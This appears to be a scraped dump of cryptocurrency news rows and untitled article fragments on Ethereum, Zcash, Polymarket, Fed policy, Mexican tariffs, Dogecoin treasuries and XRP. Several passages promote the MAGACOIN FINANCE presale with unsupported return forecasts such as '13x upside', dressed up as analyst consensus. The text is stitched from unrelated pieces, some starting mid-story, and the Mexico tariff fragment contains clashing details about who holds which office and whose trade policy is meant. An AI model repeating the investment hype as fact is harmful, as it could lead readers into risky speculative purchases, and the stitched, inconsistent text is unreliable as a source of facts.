52917733,https://en.bitcoinsistemi.com/?p=179640,1760058007,https://resources.cryptocompare.com/news/81/52917733.jpeg,Ethereum and MAGACOIN FINANCE Could Be the Biggest Winners of Upcoming Rate Cuts – Here Is Why,https://en.bitcoinsistemi.com/ethereum-and-magacoin-finance-could-be-the-biggest-winners-of-upcoming-rate-cuts-here-is-why/,"Ethereum’s recent price action has analysts watching closely, as the world’s second-largest cryptocurrency begins to mirror trends in traditional finance. Over the past few months, Ethereum (ETH) has shown an unusually tight correlation with the Russell 2000, the U.S. index tracking small-cap companies. According to research from Milk Road Macro, the two assets have moved in “eerily precise” sync – suggesting that both could soon react powerfully to an environment of lower interest rates and rising liquidity. That same liquidity narrative has sparked renewed excitement across the broader crypto market. With traders almost certain that more Federal Reserve rate cuts are coming, risk assets are starting to rebound. Investors are now looking for the projects best positioned to benefit from easier monetary conditions – and among them, MAGACOIN FINANCE has become the breakout success story of 2025. The project has already raised $16.5 million and, at its current price of $0.00052186, analysts estimate a potential 13x upside as its next phase of expansion approaches. Rate Cuts Could Ignite a New Wave of Crypto Growth Markets are pricing in a 96% probability of a 25-basis-point cut in late October and an 82% chance of another by December, according to CME futures data. Such high expectations have fueled optimism across both traditional and digital markets. For Ethereum, in particular, rate cuts could prove especially powerful. As a yield-generating asset through staking, Ethereum’s return profile becomes more attractive when central bank rates fall. “Ethereum isn’t just a speculative asset – it generates yield,” explained Justin d’Anethan, head of partnerships at Arctic Digital. “When interest rates drop, that yield becomes even more attractive.” This yield sensitivity positions ETH to outperform Bitcoin in a rate-cut cycle, as institutional and retail investors seek both exposure to crypto and steady on-chain income. A Broader Risk-On Rotation Macro trader Michaël van de Poppe believes Ethereum is on the verge of a breakout. He points to the ETH/BTC pair showing early signs of reversal after months of consolidation – a move that often signals renewed market appetite for altcoins. At the same time, gold’s record surge above $4,000 per ounce could be nearing exhaustion, potentially triggering a flow of capital from defensive holdings into higher-growth assets like Ethereum. “If the global easing cycle continues, we’ll see a strong rotation into markets with upside potential,” van de Poppe said. “Ethereum fits that category perfectly.” Technicals Hint at an Explosive Setup From a charting perspective, Ethereum appears to be forming a cup-and-handle pattern – a bullish structure that typically signals continuation after consolidation. Technical analyst Matt Hughes notes that ETH has stabilized between $4,350 and $4,400, an area likely serving as a launchpad for the next move upward. His near-term resistance target is around $5,200, while other analysts, such as the pseudonymous trader Poseidon, are forecasting a potential cycle peak around $8,500. Despite a mild 6% pullback, market sentiment remains positive. Traders widely agree that if the Fed maintains its path of rate cuts through year-end, Ethereum could become one of the most significant beneficiaries of renewed liquidity – possibly even challenging its previous all-time highs. MAGACOIN FINANCE Emerges as the Presale King of 2025 As Ethereum strengthens, smaller projects are also attracting serious investor attention. MAGACOIN FINANCE has taken the spotlight as the top presale of 2025, outperforming all rivals in both fundraising and community engagement. The project’s remarkable ability to maintain momentum during volatile market conditions has set it apart as a rare success story in an otherwise cautious landscape. In just a few months, MAGACOIN FINANCE has raised $16.5 million, drawing thousands of new participants eager to secure early positions before broader exchange listings. With its rapidly expanding ecosystem and upcoming utility integrations, the project has become a talking point across major crypto forums and social platforms. Analysts covering early-stage opportunities predict that investors entering at the current $0.00052186 price level could see returns of up to 13x as MAGACOIN FINANCE moves into its next phase. Beyond its price potential, what has truly impressed the community is the project’s clear roadmap, active development, and ability to consistently deliver on milestones – qualities often lacking in typical presale tokens. This growing reputation has cemented MAGACOIN FINANCE as a leading example of how early participation in well-managed projects can generate massive upside, even during uncertain macro conditions. The Big Picture: Ethereum Leads, but Altcoins Are Rising If the Federal Reserve follows through with multiple rate cuts, the crypto market could enter one of its most bullish periods in recent memory. Ethereum is positioned to lead the charge as liquidity returns, with its staking yield acting as a magnet for capital seeking yield in a low-rate environment. Yet the growing enthusiasm around MAGACOIN FINANCE shows that investors are also hungry for early-stage opportunities – the kind that combine strong fundamentals with explosive growth potential. As liquidity spreads through the ecosystem, projects that can demonstrate tangible progress and community traction are likely to outperform. If the easing cycle continues through 2025, both Ethereum and MAGACOIN FINANCE could emerge as two of the biggest winners of the year – one as a blue-chip anchor, the other as the breakout star redefining early-stage investing in crypto.

The price has been swinging between key resistance and support zones, reflecting a market torn between optimism for another leg higher and caution over potential short-term corrections. While sentiment remains divided, on-chain data paints a more confident picture behind the scenes. Related Reading: Short-Term Holder Supply Rises By 559K Bitcoin – New Buyers Flood the Market According to recent reports, large holders and institutions continue to accumulate ETH, reinforcing the idea that the current market uncertainty may be viewed by many as an opportunity rather than a threat. At the same time, staking activity remains consistently strong, signaling long-term conviction among Ethereum’s most committed participants. The ongoing rise in staked ETH highlights confidence in the network’s security, yield potential, and role as a foundation for decentralized finance. As Ethereum hovers near decisive price levels, the market appears to be preparing for a breakout in either direction. Whether the next move favors bulls or bears, one thing is clear — Ethereum’s fundamentals remain resilient, and the persistent accumulation by major players could serve as a powerful anchor for the next major trend once market sentiment aligns. Grayscale Stakes Ethereum: A Strong Signal Of Confidence According to Lookonchain, Grayscale (ETHE and ETH ETF) has staked an additional 857,600 ETH, worth approximately $3.83 billion, once again signaling major institutional conviction in Ethereum’s long-term potential. This move underscores the growing alignment between traditional finance and blockchain infrastructure, as large-scale players continue to embrace Ethereum’s proof-of-stake model not just as an investment, but as a yield-generating and network-participating strategy. This massive staking operation carries several implications for the market. First, it effectively reduces circulating supply, since staked ETH is locked and cannot be easily sold. This dynamic strengthens Ethereum’s deflationary pressure, especially in a context where network activity and gas usage remain elevated. At the same time, the scale of this move reveals increasing institutional participation in Ethereum’s ecosystem, suggesting that the asset is being viewed less as a speculative instrument and more as digital infrastructure — a key component of the emerging tokenized economy. From a market perspective, this decision comes during a period of volatility and consolidation, where Ethereum’s price action has struggled to establish a clear direction. However, such sustained institutional staking serves as a stabilizing force, reflecting confidence that the asset’s intrinsic value continues to grow regardless of short-term fluctuations. In essence, Grayscale’s renewed staking push reinforces Ethereum’s position as the institutional cornerstone of DeFi and Web3, even as market sentiment remains mixed. If accumulation trends persist and network fundamentals hold strong, Ethereum could be preparing for a significant breakout in the coming weeks — supported not by retail speculation, but by deep, long-term capital positioning itself for the next phase of the cycle.

The 4-hour chart reveals that ETH has retraced toward its 200-period moving average, a critical dynamic support zone that often acts as a pivot point for market direction. Despite the recent dip of nearly 2%, the broader structure remains constructive, as long as bulls can maintain the price above the $4,300–$4,250 range. This area coincides with a key confluence of the 50-, 100-, and 200-period moving averages, suggesting that the current pullback could simply be a technical retest before another attempt to reclaim the $4,500 zone. A confirmed bounce from this region could set the stage for Ethereum to regain momentum and potentially retest the $4,700–$4,800 resistance range in the coming days.

Overall, while volatility persists, Ethereum continues to display resilience supported by strong on-chain accumulation and institutional staking — factors that reinforce the broader bullish narrative despite short-term market fluctuations.

VeChain historic price sentiment VeChain Price History VeChain began in 2015 as a private consortium chain for blockchain applications. It transitioned to a public blockchain with the ERC-20 token VEN in 2017 and launched its mainnet as VET in 2018. In 2018, VeChain partnered with DHL to develop blockchain solutions for logistics but saw a significant price correction, stabilizing at lower levels. The price remained relatively stable in 2019 and 2020, with occasional spikes as VeChain continued developing technology and forming partnerships. In 2021, VeChain’s price surged to an all-time high of $0.20 in May but dropped to $0.070 by December. In 2022, VeChain attempted to recover but remained below $0.10, with continued volatility throughout the year and into early 2023. Towards the end of 2023, the price saw a slight uptick, stabilizing around $0.020 by early 2024. In 2024, VeChain’s price fluctuated, recovering to $0.025 by mid-March but dropping due to bearish trends, reaching a low of $0.019 by August. It traded around $0.021 in September but ended the month above the $0.024 mark. The price remained mostly stable in October, with the occasional bearish movement causing a decline from the $0.02400 level to start November at the $0.02100 price level. The asset closed November at a high level, with prices near the $0.04600 mark and a strong bullish outlook. However, the bulls only took the price higher in December, as the $0.0500 resistance was crushed swiftly. As of January 2025, VET traded around the $0.04300 mark as it started and closed the month around the same level. In February, the price fell towards the $0.03000 mark as bears took over, ending the month at $0.02800. In March, the net movement was low, but the volatility was very high, as the price fell to $0.02200 where it closed the month. In April the price saw an initial crash but observed sharp recovery ending the month above the $0.02600 mark. In May the price dwindled again ending the month around $0.0250.

52917701,602672,1760058042,https://resources.cryptocompare.com/news/13/52917701.jpeg,Why Zcash Beats Monero And Even Bitcoin: MIT Research Scientist,https://bitcoinist.com/zcash-beats-monero-bitcoin-mit-research-scientist/,"MIT research scientist and Zcash co-founder Madars Virza has set off a fresh round of privacy-coin debate after arguing that Zcash’s shielded pool delivers materially stronger anonymity than Monero’s ring-signature model—and that Zcash’s design choices also give it an edge over Bitcoin in a post-quantum world. Virza framed the discussion with a pointed update to the “conservative advice” that circulated in Bitcoin’s early years. “Conservative advice back then: ‘allocate 1% of your NW to Bitcoin,’” he wrote on October 7. “Conservative advice today: ‘encrypt at least 1% of your Bitcoin.’” The shift in emphasis—from owning BTC to hardening its transactional privacy—set the stage for an extended technical exchange about how different privacy systems hold up under modern analysis. Zcash Better Than Monero And Bitcoin? Pressed by an X user on “Why not Monero ?”, Virza argued that Monero’s core privacy primitive—ring signatures with fixed-size decoy sets—creates a relatively small and attackable anonymity set. “Each Monero spend references the actual spend (just like in Bitcoin) plus 16 randomly decoys,” he wrote. “16 is not a large number and easily falls to generic attacks,” he added, pointing to research presentations on tracing heuristics. He further noted that real-world sampling biases can shrink the effective protection: “Because of biases in the random distribution, 16 is more like 4.2 in practice (OSPEAD attack).” In other words, even though each spend is bundled with 16 decoys, selection patterns can leak enough information that the true spender becomes statistically distinguishable far more often than users expect. By contrast, Virza said, Zcash’s fully shielded transfers avoid the small, fixed ring entirely. “Each shielded Zcash spend has an anonymity set of all previous Zcash outputs in that shielded pool—that’s millions and thus much more private,” he wrote. Because the system proves correctness with zero-knowledge proofs, the transaction does not have to disclose which prior note is being spent, so the anonymity set scales with the entire shielded pool rather than a handful of decoys. Virza also pointed to practical composability as a strategic advantage: “Another reason for Zcash is DeFi integrations—you have deep liquidity for atomic swaps.” In his view, those integrations make it easier for users to move value into and out of the shielded pool and, potentially, to “encrypt” portions of their Bitcoin exposure via swap-based workflows. ZEC Is Almost Quantum-Secure A second vector in Virza’s critique concerned long-term security against quantum adversaries . “Zcash is also post-quantum private (if you use unique shielded addresses) but a quantum adversary will be able to completely recover Monero transaction graph by breaking discrete logs for all key images,” he wrote. The point is subtle but consequential: Monero’s linkability-prevention relies on properties (discrete logarithms) that are known to be vulnerable to sufficiently advanced quantum computers , which could allow future attackers to map historical spending relations. Zcash’s shielded model, by design, leaves far less reconstructable metadata on-chain—so even if public-key systems eventually fall to quantum attacks, there is less transactional structure for an adversary to “unwind.” Zcash engineer Sean Bowe reinforced the same theme in a July exchange that Virza cited, arguing that Zcash’s privacy stems from the omission of sensitive data rather than the obfuscation of it. “For example, there is no quantum computer or powerful AI that will be able to look back at the Zcash blockchain 1000 years from now and figure out who made every fully shielded transaction,” Bowe wrote. “That information, among other things, never even touches the ledger. It’s already gone.” He added that while boundary surfaces—where shielded transactions meet exchanges, wallets, or other public systems—can still leak, the baseline is unusually strong: “To be certain about your privacy you must start by using shielded Zcash. You almost cannot even begin otherwise.” In Bowe’s words, Zcash begins from “something that is already extremely private” and is working toward global scalability from that foundation. At press time, ZEC is up almost 52% since yesterday, trading at $194.",Crypto News|bitcoin|btc|monero|XMR|ZCash|Zcash News|ZCash Price|ZEC|ZEC News,EN,0,0,CRYPTOCURRENCY|ZEC|XMR|BTC|RESEARCH,"{'name': 'Bitcoinist', 'img': 'https://images.cryptocompare.com/news/default/bitcoinist.png', 'lang': 'EN'}",bitcoinist,2025-10-10 01:00:42

Here's what's making news in the markets: Welcome to Asia Morning Briefing, a daily summary of top stories during U.S. hours and an overview of market moves and analysis. For a detailed overview of U.S. markets, see CoinDesk's Crypto Daybook Americas. ANALYSIS Polymarket's potential launch of the POLY token may mark the end of UMA’s reign over prediction markets and the beginning of an era where truth itself is governed in-house. So far, the token has only been teased. Nothing is known about the tokenomics or utility of the token, but given complaints from the community, it's possible to speculate on what it might be. After years of outsourcing resolution to UMA’s 'optimistic' oracle, a system where anyone can propose an outcome by staking collateral and UMA token holders vote to settle disputes, an arrangement that recently produced multiple episodes of whale-led manipulation , the occasional contradiction from Polymarket itself , and community outrage, Polymarket might be building its own truth layer – a mechanism to resolve markets in-house. Hypothetically, the token would likely sit beside the betting engine, not inside it: wagers in USDC, governance and curation in POLY. That separation could be the key to what UMA never solved: finding a way to make decentralized truth expensive to corrupt and fast enough to trust. UMA’s tokenomics were designed around an “optimistic oracle” where UMA token holders vote to resolve disputes. In theory, UMA voters are rewarded for aligning with the majority and penalized for voting incorrectly, creating a "" Schelling-point "" model of truth. In theory, this structure rewards consensus, not necessarily accuracy. Large UMA token holders can potentially sway outcomes to protect their own positions, while smaller voters are incentivized to follow majority signals rather than independently verify facts. Because rewards are paid in UMA regardless of whether the final result accurately reflects reality, critics argue that the system often prioritizes coordination over correctness. This leaves markets theoretically vulnerable to potential manipulation, as seen during the saga of Ukraine-themed betting contracts, when truth and token incentives diverge. If Polymarket internalizes resolution through POLY, it could signal a broader shift in how decentralized truth is financed and maintained. By separating wagers from governance, Polymarket would be able to price honesty independently of the outcome of any single bet. UMA showed that decentralized oracles can be built, but not that they can be fully trusted when incentives drift from truth. POLY, if it exists as envisioned, could restore the link between accuracy and reward that prediction markets were supposed to embody. In that sense, the coming token is not just another governance asset. Instead, it's a bet on whether truth can finally be made liquid, accountable, and owned by the market it serves. But of course, this is just informed speculation.

Barr warned that tariffs could result in persistent inflation. In remarks prepared for an event with the Economic Club of Minnesota on Thursday, October 9, the Fed Governor noted that common sense suggests a cautious approach is suitable in the face of increased uncertainties. With this, he urged Fed officials to exercise caution when changing policy, allowing them to gather more data, update their predictions, and gain a better understanding of the risks involved. Meanwhile, reports from sources have highlighted that the US central bank lowered its key interest rate by 0.25% last month, marking the first cut of the year. Barr points out the uncertainties surrounding the current inflation status Barr illustrated his strong support for a cautious approach to decision-making on further interest rate cuts. He noted that lawmakers currently encounter hardship due to concerns about reduced employment and increasing inflation. Regarding the situation, a reliable source conducted a median estimation and discovered that officials expect two more rate cuts later this year, as forecasted in the decision released with this update. Barr also took notice of the effects of US President Donald Trump’s tariff policies on inflation. He mentioned that, although the short-term impacts of Trump’s tariff policies on inflation have been less significant than anticipated by experts, there is still a likelihood of price hikes in the future as firms use up their current stock and work to maintain profit margins by raising prices. He further explained that although tariffs are meant to cause temporary price hikes and should not result in lasting inflation, this is not the case if prices continue to increase each month and influence what individuals expect. “There has not been anything ‘one-time’ or easy to predict about these tariff increases,” he added. Based on his argument, businesses and consumers might start making decisions about spending, pricing, and wages because they believe that inflation will continue to rise, creating a pattern of ongoing increases. Barr calls on individuals to be cautious of risks associated with the job market Concerning the jobs market, Barr said it is difficult to determine how much of a recent drop in job creation is caused by decreased demand. Afterwards, he cited signs indicating that labor supply and demand are still roughly balanced, such as the number of job openings relative to the number of unemployed workers. However, Barr raised concerns that even though the job market status is currently balanced, this balance results from a significant drop in both the number of individuals seeking jobs and the number of new hires. This illustrates the likelihood that the job market will face greater threats if something adverse were to happen. The Federal Reserve’s next meeting on interest rates is scheduled for October 28- 29. During a question-and-answer session after his speech, Barr hinted that they will decide whether to reduce rates again at their next meeting. Although this decision could enhance the job market, it may also create significant inflationary problems. Hence, making this decision is a difficult task. In the meantime, a former US Federal Reserve Governor, Larry Lindsey, has reportedly withdrawn his name from a list of candidates running for the Fed chair position. Lindsey explained his actions, stating that all he wanted was to be happy and focus on his life, and did not want to give that up for the challenges of public life.

The proposal will now be resurrected after November 23. Ricardo Monreal, the leader of the governing Morena party in the lower house, stated that he had received confirmation of a delay and emphasized that lawmakers needed to examine it very seriously. It would come back for discussion no later than the end of November, he added. The action is a temporary pause on what could be one of its most significant changes to American trade policy in years. The proposed plan, supported by President Claudia Sheinbaum of Mexico City’s administration, would impose new import duties ranging from 10% to 50% on approximately 1,400 categories of goods. The products affected encompass a broad range of goods, including cars, steel, auto parts, toys, and furniture. Those tariffs would be applied to goods from countries with which Mexico does not have a free trade agreement, including China, India, and South Korea. Its economy minister, Marcelo Ebrard, has stated that the measure is designed to help protect Mexican industries from what he sees as “unfair competition.” He believes that cheap imports, especially from China, are causing local companies to flounder and eroding the country’s manufacturing might. Lawmakers weigh economic risks While the government has stated that the tariffs would strengthen Mexico’s industrial base , some lawmakers and economists have cautioned against moving too quickly. Critics warn that raising tariffs on such a broad array of goods could drive up production costs, disrupt supply chains, and ultimately lead to higher prices for consumers. The Bank of Mexico has also stated that the tariffs would add inflationary pressure at a time when the country is attempting to stabilize prices and lower interest rates. Accordingly, some in Congress have sought to delink the proposal from the 2026 national budget and ensure that it is scrutinised even more narrowly for its economic impact. Senator Ricardo Monreal said that legislators were not in a rush to take such a sensitive decision. He was, however, concerned that the suggested tariffs would affect not just Asian exporters but also local industries that use imported materials and parts. Entrepreneurs, meanwhile, have called for greater consultation. Trade groups argue that Mexico should support local manufacturers without compromising competitiveness or investment stability. China complains as trade tensions escalate China lambasted Mexico’s scheme, calling it a unilateral and damaging act. The Chinese Commerce Ministry said the move could “seriously affect” Mexico’s business environment predictability and threaten foreign investor confidence. China countered by initiating an inquiry to remove trade barriers and protect its industries. The probe will determine whether the intended tariffs deviate from international trade norms and could lead to retaliatory measures if implemented. Some Chinese officials also said the decision appeared in part to be a response to American pressure, signaling that Mexico was coming on board with the latest efforts by Washington to push back against Chinese manufacturing power in North America. President Claudia Sheinbaum rejected the assertion, saying that Mexico’s trade policy was sovereign and that it must protect its own economic interests. She stressed that her government did not want to pick a fight, but was instead working to protect national industry and pave the way for fair competition. The tariff spat comes at an uncomfortable moment for Mexico’s trading relationships. The clock is ticking to fulfill the USMCA’s mandated review next year. Some analysts argue that Sheinbaum’s proposed tariff might serve as a bargaining chip in negotiations between the United States and Mexico, demonstrating to Washington that its neighbor is willing to confront China’s trade influence in North America. However, others warn that striking would risk alienating China, one of Mexico’s largest non-American trading partners. China remains a significant supplier of affordable industrial and consumer goods, and any further deterioration of relations could strain diplomatic and commercial ties.

The latest example comes from CleanCore Solutions Inc., which has quickly become one of the largest corporate holders of Dogecoin – and its early success is already sparking comparisons to other fast-rising projects like MAGACOIN FINANCE, a 2025 standout expected to mirror Dogecoin’s early growth trajectory in the coming bull market. Barely a month after launching its Dogecoin Treasury, CleanCore’s holdings have already surpassed 710 million DOGE, with unrealized profits topping $20 million. The firm initially raised $175 million in a private placement to fund its accumulation plan, partnering with Bitstamp by Robinhood to handle purchases and custody. The treasury’s purpose, according to company executives, is not short-term speculation but a long-term digital reserve strategy that builds value over time while supporting Dogecoin’s ecosystem development. CleanCore’s Long-Term Vision for Dogecoin CleanCore CEO Clayton Adams said the company aims to transform how corporate treasuries interact with digital assets. “We’re not just holding DOGE – we’re helping shape its next chapter through strategic partnerships and ecosystem development,” he explained. Adams revealed that the company’s next goal is to reach one billion DOGE, a milestone that would solidify CleanCore’s role as a leader in corporate crypto adoption. The company’s treasury operations are conducted under a regulated framework designed in collaboration with Bitstamp USA, ensuring transparency and compliance. CleanCore is also exploring yield-bearing opportunities within the treasury, potentially bridging traditional finance with the Dogecoin economy. This forward-thinking approach has turned the firm into a symbol of how meme coins are maturing into serious institutional assets. Corporate Demand for DOGE Surges CleanCore’s expansion marks part of a wider trend. Across the corporate landscape, a wave of Dogecoin accumulation is reshaping perceptions about the asset. In July, BitOrigin unveiled a $500 million DOGE initiative, beginning with an initial purchase of over 40 million tokens. Around the same time, Trump’s Thumzup Media increased its exposure by buying large quantities of Dogecoin mining equipment and establishing custody solutions with Coinbase Prime. These moves collectively represent a shift in sentiment – Dogecoin is no longer being treated as a meme but as a liquid, community-driven digital reserve. Institutional activity, coupled with upgrades to the Dogecoin network, is reinforcing that narrative. Strengthening Fundamentals Ahead of the Next Bull Run Dogecoin’s network has also taken a significant technical leap forward with the rollout of the Cardinals Index Node, a key upgrade improving decentralization, validation speed, and transaction reliability. Analysts believe this could strengthen DOGE’s fundamentals just in time for the next market expansion. As CleanCore accelerates toward its billion-DOGE milestone, many experts view its initiative as proof that corporate treasuries are evolving. Digital assets – once dismissed as speculative – are now being embedded into real-world balance sheets as long-term stores of value. With institutional inflows continuing to grow, Dogecoin’s role as a pioneer among meme-based assets appears stronger than ever. MAGACOIN FINANCE Rises as the New Favorite of 2025 While Dogecoin is making strides on the corporate front, another project is capturing the imagination of early investors: MAGACOIN FINANCE. The project’s meteoric rise in 2025 has drawn comparisons to Dogecoin’s earliest success story – but with one key difference: MAGACOIN FINANCE’s fundamentals are built for sustainability. The project has already achieved remarkable milestones, expanding its ecosystem and drawing tens of thousands of new participants within months. What sets MAGACOIN FINANCE apart is its structured growth model, strong community engagement, and rapidly increasing global visibility. Experts project massive upside potential as the project continues its expansion, calling it one of the best-performing altcoins of the 2025 bull market. Many traders who missed Dogecoin’s early surge are now viewing MAGACOIN FINANCE as the next big opportunity to capture early-stage exponential growth before major exchange listings begin. Outlook: Meme Coins Mature, Institutions Follow The line between “meme coin” and “mainstream asset” is becoming increasingly blurred. Dogecoin’s adoption by companies like CleanCore and BitOrigin signals that the crypto market’s next growth phase will include both legacy names and new contenders. As the digital asset space evolves, MAGACOIN FINANCE’s community-driven expansion mirrors Dogecoin’s early spark – but with the backing of modern development frameworks, strategic partnerships, and global reach. With both institutional adoption and grassroots enthusiasm driving momentum, 2025 may be the year when meme-inspired tokens truly become pillars of the crypto economy.

Ethereum Price Prediction Ethereum (ETH) is in the limelight as it trades at around $4,490, consolidating at levels above $4,450. The new surge, driven by ETF optimism and institutional accumulation, provides a solid foundation on the next step. On-chain data indicates an increased staking participation, growing DeFi activity, and capital movement into ETH via alternative altcoins. Should ETH cross the mark of $4,600, analysts see a swift climb to $5,200 in the coming days, due to the steady inflows of ETFs and future upgrade of Fusaka. Nevertheless, a decline below $4,450 would cause liquidations, which might get prices down to $4,200. Cardano Price Prediction Cardano (ADA) is trading around $0.823, which consolidates in a narrow range of $0.805 to $0.842. The price system indicates a possible change. The breakout above $0.842 may open a way further to $0.878 and $0.906, whereas a consistent support at above $0.80 will affirm accumulation. According to market data, open interest has increased to $1.57 billion, which shows new speculative activity. Also, the fact that ADA was included in the S&P Broad Crypto Index Fund and Nasdaq Crypto Index ETF by Hashdex highlights increased institutional involvement. ADA Open Interest: Source: Coinglass Cardano’s ongoing ecosystem expansion, including governance updates and venture funding, strengthens its mid-term outlook. Analysts suggest that holding above $0.80 could trigger a short-term rally in November. Chainlink Tops DeFi Development List Chainlink (LINK) continues to lead the decentralized data infrastructure segment, securing integrations across major DeFi protocols. After a strong rally, LINK is now stabilizing near key support levels, consolidating gains while developers build new use cases for its Cross-Chain Interoperability Protocol (CCIP). Additionally, Chainlink ranks at number one in Santiment’s October DeFi developer activity. Source: Santiments Analysts note that LINK’s sustained developer activity and new partnerships indicate long-term strength. If LINK breaks above its near-term resistance around $22, momentum could drive it toward $28 in November. XRP Price Prediction XRP continues to print lower highs despite Bitcoin’s record gains, suggesting waning buyer strength. The pattern indicates potential downside volatility, with analysts warning that a break below $2.65–$2.70 could trigger a drop toward $2.00. The MACD histogram supports a bearish outlook, showing deeper negative bars as momentum weakens. While XRP retains a strong narrative for payments, its near-term outlook depends heavily on Bitcoin’s stability. A move above $3.10, accompanied by volume confirmation, will invalidate the bearish trend. MAGACOIN FINANCE Tops Analyst November Watchlist The most talked-about new entrant in October is MAGACOIN FINANCE , an Ethereum-based presale that has already raised over $15 million. MAGACOIN FINANCE runs on Ethereum, a feature that attracts investors interested in the reliability and liquidity prospects of the project before its listing on exchanges in Q4 2025. Unlike many speculative presales, MAGACOIN FINANCE follows a structured roadmap with verified smart contracts and strong community growth. Analysts view its $15 million raise as proof of investor confidence and a signal of sustained demand ahead of its upcoming exchange listing. Analyst coverage compared MAGACOIN FINANCE to successful Ethereum based tokens in prior cycles that had substantial post listing returns. As the whale accumulation and retail adoption rates grow, MAGACOIN FINANCE is the most promising opportunity in November. Conclusion November’s altcoin watchlist highlights a mix of proven assets and emerging stars. Ethereum, Cardano, Chainlink, and XRP are still huge players with institutional backing. Nonetheless, MAGACOIN FINANCE is in the first position, drawing attention of investors due to its Ethereum-based structure and expected Q4 2025 listings. Consequently, this presale tops analyst’s choice of best altcoin to buy in November. MAGACOIN FINANCE Praised by Analysts for Audit-Backed Legitimacy Analysts continue to praise MAGACOIN FINANCE for its audited foundation and verified transparency on Hashex.org , marking it as a high-trust presale.

By moving beyond theory and into practical application, XRP technology is being adopted by banks, payment networks, and central institutions seeking faster and more efficient cross-border transfers. XRP As The Bridge Between Old And New Finance While most of the crypto world obsesses over price swings and short-term narratives, Ripple is quietly executing on something much larger: a structural rewrite of global finance. As Xfinancebul pointed out on X, XRP isn’t here to compete with other cryptocurrencies. It’s here to replace the old system that still underpins international payments today. Related Reading: XRP At $10K? Analyst Sees $800 Trillion Liquidity Boom Thunes and Ripple’s relationship is a prime example of this transformation in motion. Together, they connect over 130 countries and tap into more than 90% of the global foreign exchange (FX) markets, effectively stitching together a new global settlement network powered by XRP. Combined, these two powerhouses are actively unlocking real-time settlement, establishing vital liquidity corridors, and pushing enterprise-grade blockchain integration onto a global stage. Thus, the numbers are powering over $70 billion in annual payment volume, spanning multiple currencies. However, while most crypto communities have remained fixated on price charts and short-term gains, Ripple has engaged in collaboration. The firm is working directly with banks, navigating complex regulatory landscapes, and integrating with global networks to fix the speed, cost, and transparency that the SWIFT system has been struggling with. Xfinancebul highlighted that this profound utility validates everything XRP has always stood for. XRP is not just another token, but a foundation piece of digital finance that is now seeing adoption at an accelerating scale within the institutional level. The game truly changes when liquidity begins to flow seamlessly through XRP, instead of being bogged down by legacy rails. This isn’t just a minor improvement for payments, but a paradigm shift for the entire global financial ecosystem. Digital Asset That Refuses To Slow Down An analyst known as Ripple Track has also emphasized that XRP is engineered for speed, institutional trust, and a tool for future global financial transformation. Presently, that future is already starting to echo through the charts.

In the meantime, XRP Healthcare (XRPH), a token in the Ripple ecosystem, is coiling like a spring, with pressure building steadily, momentum rising to the surface, and the charts screaming ready to launch. “History doesn’t repeat itself, but when it rhymes out loud, the wise listen,” the analyst mentioned.

52919680,602381,1760061646,https://resources.cryptocompare.com/news/13/52919680.jpeg,New XRP ETF Filing With SEC Emerges From The Shadows With An Interesting Twist,https://bitcoinist.com/new-xrp-etf-filing-with-sec/,"A surprising development has drawn attention within the XRP community as a new exchange-traded fund proposal centered around the cryptocurrency quietly surfaced. The filing, which was submitted to the US SEC by GraniteShares, outlines a plan for a 3× leveraged XRP ETF that’s designed to amplify the altcoin’s daily performance. Although the fund is not the Spot XRP ETF that many investors have been waiting for, its sudden appearance is a big step toward institutional recognition of the token in the US. GraniteShares Proposes 3× Leveraged XRP ETF According to documents filed with the SEC, GraniteShares is proposing to list a 3× leveraged XRP ETF to provide investors with triple the daily returns of spot performance. In essence, if the altcoin rises by one percent in a day, the ETF would seek to rise by approximately three percent, and vice versa for losses. This kind of leveraged exposure is commonly favored by short-term traders looking to take advantage of intraday price movements rather than long-term holders. The GraniteShares filing also revealed plans for other similar leveraged products tied to other major cryptocurrencies, including Bitcoin (BTC), Ethereum (ETH), and Solana (SOL). The proposed product stands out, however, because it is one of the first attempts to introduce such a leveraged fund for XRP after the token’s regulatory clarity was established in the United States. These funds reset daily, and the fact that an issuer like GraniteShares is seeking approval for an XRP-related ETF reinforces that the token is slowly making its way back into Wall Street’s radar. If all goes well, these ETFs are going to be on track to be launched in December 2025. It will join the list of ETFs like ProShares Ultra XRP ETF, Teucrium, and Volatility Shares, which offer 2x daily exposure through futures contracts. The Altcoin Needs Good News Like This The token’s price action has been relatively muted in the past week and it has underperformed compared to Bitcoin and Ethereum. Recent on-chain data shows that negative sentiment toward the asset has climbed to a six-month high , and this is a reflection of the frustration among traders over its sluggish performance compared to other top cryptocurrencies. XRP’s behavior can be attributed to the absence of events capable of contributing to confidence. Bitcoin and Ethereum, for example, have benefited from strong institutional inflows in the past week.. The newly surfaced ETF filing from GraniteShares, therefore, comes at an important time, as it provides much-needed bullish momentum and hints that major financial players are still willing to explore products related to the token. The leveraged ETF proposal, while encouraging, does not carry the same weight as Spot ETFs. Discussions around the token over the past few months have been centered around the ongoing delay in its Spot ETF approvals. Many analysts have pointed out that such a milestone would serve as the base for the altcoin’s next extended breakout. However, these spot ETFs are currently stuck due to the US government’s ongoing shutdown. At the time of writing, XRP is trading at $2.83, down by 1% in the past 24 hours.",XRP|bitcoin|btc|ETH|Ethereum|GraniteShares|ProShares Ultra XRP ETF|ripple|SOL|solana|Spot XRP ETF|Teucrium|US SEC|Volatility Shares|XRP news|XRP price|XRPUSD|XRPUSDT,EN,0,0,CRYPTOCURRENCY|XRP|ETH|BTC|REGULATION,"{'name': 'Bitcoinist', 'img': 'https://images.cryptocompare.com/news/default/bitcoinist.png', 'lang': 'EN'}",bitcoinist,2025-10-10 02:00:46

